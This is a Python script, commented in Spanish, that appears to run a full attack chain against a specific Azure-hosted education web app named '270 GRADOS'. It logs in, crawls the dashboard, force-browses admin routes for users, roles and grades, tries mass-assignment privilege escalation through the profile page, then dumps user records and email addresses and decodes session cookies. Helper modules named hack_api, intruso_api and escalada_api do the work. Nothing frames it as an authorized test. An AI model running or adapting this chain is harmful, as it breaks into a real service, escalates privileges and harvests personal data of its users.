"""Corre la cadena completa contra 270 GRADOS y resume. Uso: python chk270.py ALIAS CLAVE"""
import sys, json
import hack_api as H, intruso_api as I, escalada_api as E

BASE = 'https://app-landing-270-grados-dgbedwcgaxcdavc2.eastus2-01.azurewebsites.net'
LOGIN = BASE + '/Auth/Login'

def p(t, d):
    print('\n=== ' + t + ' ===')
    print(json.dumps(d, ensure_ascii=False, indent=1)[:3000])

alias, clave = sys.argv[1], sys.argv[2]

r = I.entrar(LOGIN, alias, clave, campo_extra='Recordarme=true')
p('LOGIN', {'ok': r.get('ok'), 'url': r.get('url_final'), 'error': r.get('error')})
if not r.get('ok'):
    sys.exit('no entro')

nav = I.navegar(BASE + '/Dashboard/Home', profundidad=2, limite=12)
enlaces = []
for pg in nav.get('paginas', []):
    pass
links = []
for f in nav.get('formularios', []):
    links.append(f['url'])
p('MENU', {'paginas': [x['url'] for x in nav.get('paginas', [])][:25],
           'interesantes': nav.get('interesantes', [])})

rutas = ('Dashboard/Usuarios Dashboard/Aprendices Dashboard/Instructores Dashboard/Fichas '
         'Dashboard/Reportes Dashboard/Configuracion Dashboard/Roles Dashboard/Programas '
         'Dashboard/Matriculas Dashboard/Notas Dashboard/Calificaciones Dashboard/Perfil '
         'Dashboard/Cuenta Dashboard/Usuario').split()
fp = E.forzar_panel(BASE, rutas=','.join(rutas), limite=15)
p('FORZAR', {'rotas': fp.get('rotas'), 'halladas': [(f['ruta'], f['status'], f['largo'])
                                                    for f in fp.get('halladas', [])]})

perfil = ''
for x in nav.get('paginas', []) + [{'url': BASE + '/' + r} for r in rutas]:
    if any(k in x['url'].lower() for k in ('perfil', 'cuenta', 'datos', 'usuario/editar')):
        perfil = x['url']
        break
canario = (BASE + '/' + fp['rotas'][0]) if fp.get('rotas') else None
if perfil:
    pm = E.probar_masivo(perfil, canario=canario, url_login=LOGIN, usuario=alias, clave=clave)
    p('MASIVO', {'perfil': perfil, 'logrado': pm.get('logrado'), 'via': pm.get('via'),
                 'campo': pm.get('campo'), 'valor': pm.get('valor')})
else:
    print('\n=== MASIVO === sin ruta de perfil')

for ruta in (fp.get('rotas') or [])[:3]:
    us = I.sacar_usuarios(BASE + '/' + ruta, max_filas=25)
    p('USUARIOS ' + ruta, {'filas': us.get('filas', [])[:12], 'correos': us.get('correos', [])[:15]})

p('COOKIES', E.decodificar_cookie())
print('\nFIN')
